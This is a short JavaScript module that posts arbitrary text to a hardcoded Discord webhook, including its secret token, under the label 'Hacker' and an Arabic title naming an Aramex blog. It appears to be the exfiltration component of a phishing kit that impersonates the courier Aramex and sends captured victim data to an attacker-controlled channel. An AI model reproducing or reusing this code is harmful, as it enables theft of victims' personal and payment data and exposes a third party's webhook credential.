import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325469497141886996/62t7UhQ9uIPNtpHQ5K41-j3BM11KMQpvpA7aN7C5vFmg1ucsHKQS4lfcsIg4DhbVsRZl",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
